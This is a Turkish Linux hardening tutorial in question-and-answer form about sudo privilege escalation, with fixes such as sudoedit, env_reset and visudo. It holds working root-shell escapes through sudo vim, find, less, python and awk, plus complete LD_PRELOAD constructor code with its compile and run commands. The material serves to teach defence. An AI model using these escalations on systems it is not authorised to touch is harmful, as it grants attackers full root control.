# GÜN 134: Linux Sudo ve Ayrıcalık Devri Soru-Cevap ve Derinlemesine Analiz

## Soru 1: GTFOBins Zafiyetleri Nedir ve Sudo İzinlerinde Yer Alan Standart Komutlar (vim, find, less, awk) Kullanılarak Nasıl Yetki Yükseltme (Privilege Escalation) Gerçekleştirilir?

### 1. Soru Başlığı ve Tanımı
GTFOBins, meşru Unix ikili dosyalarının (binaries) yanlış yapılandırılmış sudoers, SUID/SGID veya Linux Capabilities izinleri altında çalıştırılması durumunda sistem kısıtlamalarını aşmak, rastgele dosya okumak/yazmak ve interaktif bir root kabuğu elde etmek (shell escape) amacıyla istismar edilmesini belgeleyen bir güvenlik referans projesidir.

### 2. Derinlemesine Teknik Analiz
Linux'ta birçok komut satırı aracı, kullanıcı deneyimini zenginleştirmek veya otomasyon sağlamak amacıyla kendi içinden alt süreç (child process) başlatma veya harici komut çalıştırma yeteneklerine sahiptir. Bu araçlar `sudo` ile çalıştırıldığında, çağıran sürecin Efektif Kullanıcı Kimliği (EUID) 0 (`root`) olur. Bu araç içinden başlatılan her alt süreç de doğal olarak root yetkilerini devralır:

1. **Vim / Vi Editörü (`:!/bin/sh`):**
   Vim içerisinde ünlem işareti (`!`) bir kabuk komutunu yürütmek için kullanılır. `sudo vim <dosya>` komutunu çalıştıran bir kullanıcı, komut modunda `:!/bin/sh` veya `:set shell=/bin/sh` ardından `:shell` yazdığında, Vim doğrudan root UID'si ile `/bin/sh` sürecini çatallar (`fork`/`execve`).
2. **Find Komutu (`-exec`):**
   `find` komutunun `-exec` parametresi, bulunan dosyalar üzerinde komut çalıştırmak üzere tasarlanmıştır. `sudo find /etc -exec /bin/sh \; -quit` komutu verildiğinde ilk eşleşmede derhal root kabuğu açılır.
3. **Less ve More Sayfalayıcıları:**
   Büyük metin dosyalarını sayfalarken `!/bin/sh` yazıldığında sayfalayıcı alt kabuğa geçiş yapar.
4. **Programlama Yorumlayıcıları (Python, Perl, Ruby, AWK):**
   Bu araçlar doğrudan POSIX sistem çağrılarını yapabilir. Örneğin:
   `sudo python3 -c 'import os; os.system("/bin/bash")'`
   veya AWK ile:
   `sudo awk 'BEGIN {system("/bin/sh")}'`

### 3. Gerçek Dünya Senaryosu ve Pratik Çözüm
**Senaryo:** Bir Linux web sunucusunda sistem yöneticisi, junior geliştiricinin Nginx yapılandırma dosyasını güncelleyebilmesi için `/etc/sudoers` dosyasına şu satırı eklemiştir:
```text
g Gelistirici ALL=(ALL) /usr/bin/vim /etc/nginx/nginx.conf
```
Geliştiricinin SSH parolası kimlik avı yoluyla ele geçirilir. Saldırgan sunucuya girer ve `sudo /usr/bin/vim /etc/nginx/nginx.conf` komutunu çalıştırır. Ardından editör içinde `:!/bin/bash` yazarak anında root olur ve tüm veri tabanını dışarı sızdırır.

**Pratik Çözüm:**
1. Kullanıcılara doğrudan metin editörleri için sudo yetkisi verilmemelidir. Bunun yerine **`sudoedit`** (veya `sudo -e`) mekanizması kullanılmalıdır. Sudoedit, dosyayı geçici bir konuma (`/tmp`) kopyalar, kullanıcının kendi haklarıyla düzenlemesini sağlar ve ardından içeriği güvenle hedef dosyaya yazar. Böylece editör root olarak çalışmaz!
2. Alternatif olarak kurala `NOEXEC` etiketi eklenerek ikili dosyanın alt süreç başlatması engellenebilir (LD_PRELOAD bazlı sudo_noexec.so):
```text
# Güvenli sudoedit kuralı
gelistirici ALL=(ALL) sudoedit /etc/nginx/nginx.conf
```

### 4. Ustanın Çırağa Tavsiyesi
Evlat, bir komuta sudo verirken kendine sor: "Bu program bir alt süreç başlatabilir mi, dosya açabilir mi, komut çalıştırabilir mi?" Cevap evetse, o komut artık bir araç değil, root kabuğuna açılan gizli bir kapıdır. Editör vereceksen `sudoedit` ver, asla doğrudan `vim` veya `nano` verme!

---

## Soru 2: `env_keep` Direktifi Üzerinden `LD_PRELOAD` ve Paylaşımlı Kütüphane Enjeksiyonu (CWE-426 / T1574.006) Saldırısı Nasıl Gerçekleşir ve Neden `Defaults env_reset` Hayatidir?

### 1. Soru Başlığı ve Tanımı
Linux dinamik bağlayıcısı (`ld-linux.so`), bir yürütülebilir dosya çalıştırılmadan önce `LD_PRELOAD` çevre değişkeninde tanımlanan paylaşımlı kütüphaneleri (`.so`) belleğe yükler. Sudo yapılandırmasında `Defaults env_reset` kapalıysa veya `env_keep` listesine tehlikeli değişkenler eklenmişse, düşük yetkili bir kullanıcı kötü amaçlı bir kütüphane derleyerek izinli herhangi bir sudo komutu üzerinden anında root yetkisine yükselir.

### 2. Derinlemesine Teknik Analiz
Linux işletim sisteminde bir dinamik ELF binary'si çalıştırıldığında kütüphane yükleme önceliği şu sırayı izler:
1. `LD_PRELOAD` ile belirtilen kütüphaneler.
2. `LD_LIBRARY_PATH` dizinleri.
3. `/etc/ld.so.cache` içerisindeki sistem kütüphaneleri.

Sudo, SUID (`setuid`) biti aktif bir binary olduğu için çekirdek seviyesinde standart güvenlik kontrollerine tabidir. Normalde çekirdek, farklı bir UID'ye geçerken `LD_PRELOAD` gibi değişkenleri temizler. Ancak Sudo kendi içinde çalıştırdığı hedef süreci başlatırken `/etc/sudoers` ayarlarını uygular:
- **`Defaults env_reset`:** Sudo çalıştırıldığında çağıran kabuğun (kullanıcının) tüm çevre değişkenlerini siler ve sıfır, temiz bir ortam oluşturur.
- **`env_keep`:** Sıkılaştırmayı delerek belirli çevre değişkenlerinin korunmasını sağlar.

Eğer `/etc/sudoers` dosyasında `Defaults !env_reset` varsa veya `Defaults env_keep += "LD_PRELOAD"` tanımlanmışsa:
Saldırgan şu C kodunu yazar:
```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init() {
    unsetenv("LD_PRELOAD");
    setresuid(0, 0, 0);
    setresgid(0, 0, 0);
    system("/bin/bash -p");
}
```
Derler: `gcc -fPIC -shared -nostartfiles -o /tmp/rootkit.so rootkit.c`  
Ve çalıştırır:
```bash
sudo LD_PRELOAD=/tmp/rootkit.so /usr/bin/uptime
```
`/usr/bin/uptime` çalışmadan önce `rootkit.so` yüklenir ve `__attribute__((constructor))` bloğu root UID'si altında çalışarak doğrudan root kabuğu fırlatır!

### 3. Gerçek Dünya Senaryosu ve Pratik Çözüm
**Senaryo:** Kurumsal bir Java uygulamasının özel ortam değişkenleriyle çalışabilmesi için sistem yöneticisi `/etc/sudoers.d/app` dosyasına `Defaults env_keep += "*"` yazmıştır. Sunucudaki kısıtlı bir servis hesabı ele geçirilir. Saldırgan `sudo -l` çıktısında bu direktifi görür ve 30 saniye içinde `LD_PRELOAD` kütüphanesi derleyerek tam root erişimi sağlar.

**Pratik Çözüm:**
1. `/etc/sudoers` dosyasında `Defaults env_reset` mutlaka açık olmalıdır.
2. `env_keep` listesinden `LD_PRELOAD`, `LD_LIBRARY_PATH`, `PYTHONPATH` ve `RUBYOPT` gibi kütüphane/kod yükleme değişkenleri derhal çıkarılmalıdır.
3. Yalnızca zararsız kullanıcı arayüzü değişkenlerine (Örn: `COLORS`, `DISPLAY`) izin verilmelidir:
```text
# Güvenli Defaults Yapılandırması
Defaults env_reset
Defaults env_delete += "LD_* PYTHONPATH"
Defaults secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
```

### 4. Ustanın Çırağa Tavsiyesi
Evlat, çevre değişkenleri Linux'un görünmez hayaletleridir. Sen görmezsin ama arka planda kütüphanelerin nereye bağlanacağını, hangi fonksiyonların ezileceğini onlar belirler. `env_reset` kalkanını asla indirme; `LD_PRELOAD` kelimesini sudoers dosyasında görürsen yangın alarmına bas!

---

## Soru 3: `/etc/sudoers` Dosyasının Bütünlüğü Nasıl Korunmalıdır, Dosya İzinleri Ne Olmalıdır ve Neden Doğrudan Metin Editörleri Yerine Daima `visudo` Kullanılmalıdır?

### 1. Soru Başlığı ve Tanımı
Linux işletim sistemlerinde `/etc/sudoers` ve `/etc/sudoers.d/` dizini, tüm ayrıcalık devri mantığının merkezidir. Bu dosyaların erişim izinlerinin (CWE-732) gevşek bırakılması veya `visudo` yerine standart editörlerle düzenlenmesi; ya yetkisiz kullanıcıların dosyayı değiştirip kalıcı root olmasına ya da bir sözdizimi (syntax) hatası yüzünden sistemde kimsenin root olamamasına (kilitlenme) yol açar.

### 2. Derinlemesine Teknik Analiz
`/etc/sudoers` dosyasıyla ilgili iki ölümcül risk vardır:

1. **Gevşek İzinler (Insecure File Permissions - CWE-732):**
   Sudo ikilisi çalıştırıldığında `/etc/sudoers` dosyasının izinlerini kontrol eder. Eğer dosya:
   - `root:root` sahipliğinde değilse,
   - Veya dosya izinleri başkaları tarafından yazılabilir (`others writable` / `0666`, `0777`) ise,
   Sudo güvenlik gerekçesiyle çalışmayı durdurur (`sudo: /etc/sudoers is world writable`). Eğer bu denetim olmasaydı, saldırgan dosyayı açıp tek satırla kendisini root yapabilirdi. Standart izin daima `0440` (`-r--r-----`) veya `0400` olmalıdır.

2. **Sözdizimi Hatası ve Kilitlenme (Denial of Service / Lockout):**
   Bir yönetici doğrudan `vim /etc/sudoers` veya `nano /etc/sudoers` çalıştırıp yanlışlıkla noktalama işaretini eksik bırakırsa veya yanlış bir etiket yazarsa:
   Dosya kaydedildiği anda sistemdeki hiçbir kullanıcı bir daha `sudo` çalıştıramaz! Çünkü Sudo sözdizimi hatası içeren bir dosyayı parse edemez ve `>>> /etc/sudoers: syntax error <<<` hatası vererek reddeder. Eğer sunucuda doğrudan root şifresi ile oturum açma (root SSH) kapalıysa, makineye uzaktan müdahale etmek imkansız hale gelir (tek çözüm sunucuyu single-user mode ile yeniden başlatmaktır).

**`visudo`'nun Koruma Mekanizmaları:**
- **Sözdizimi Denetimi:** Dosyayı geçici bir alanda (`/etc/sudoers.tmp`) açar. Kaydetmeden önce sözdizimini derleyici gibi denetler. Hata varsa dosyayı kaydetmez ve hatanın olduğu satırı işaret eder (`What now? [x=exit, e=edit]`).
- **Eşzamanlılık Koruması (Locking):** Aynı anda iki yöneticinin dosyayı düzenlemesini kilit dosyasıyla (`.sudoers.tmp`) engeller (Race Condition koruması).

### 3. Gerçek Dünya Senaryosu ve Pratik Çözüm
**Senaryo:** Bir bulut sunucusunda (AWS EC2) root şifresi bilinmemektedir ve yalnızca `ubuntu` kullanıcısının sudo yetkisi vardır. Sistem yöneticisi aceleyle `nano /etc/sudoers` ile dosyaya girer, kuralı yazarken parantezi kapatmayı unutur ve dosyayı kaydeder. Bir dakika sonra `sudo` çalıştırmak istediğinde syntax error alır ve sunucunun tüm yönetimsel erişimi kilitlenir. Şirket production sunucusunu kurtarabilmek için sunucuyu kapatıp diskini başka bir makineye bağlamak zorunda kalır (6 saatlik kesinti).

**Pratik Çözüm:**
1. Sudoers düzenlemeleri DAİMA `visudo` ile yapılmalıdır.
2. Otomasyon (Ansible, CI/CD, script) kullanılıyorsa `visudo -c -f <dosya>` ile sözdizimi doğrulanmadan dosya yerine kopyalanmamalıdır:
```bash
# Otomasyonda güvenli sudoers dağıtımı
cp /tmp/new_sudoers /etc/sudoers.new
# Sözdizimi denetimi
if visudo -c -f /etc/sudoers.new; then
    chmod 0440 /etc/sudoers.new
    chown root:root /etc/sudoers.new
    mv /etc/sudoers.new /etc/sudoers
    echo "[+] Sudoers başarıyla güncellendi."
else
    rm -f /etc/sudoers.new
    echo "[!] HATA: Geçersiz sudoers sözdizimi! İşlem iptal edildi." >&2
    exit 1
fi
```

### 4. Ustanın Çırağa Tavsiyesi
Evlat, Linux yöneticiliğinin altın kuralı şudur: "Sudoers dosyasına elinle dokunma, araya `visudo` koy!" `visudo` senin emniyet kemerindir. Asla `nano /etc/sudoers` yazma; dosya izinlerini de `0440`'tan bir milim bile gevşetme!
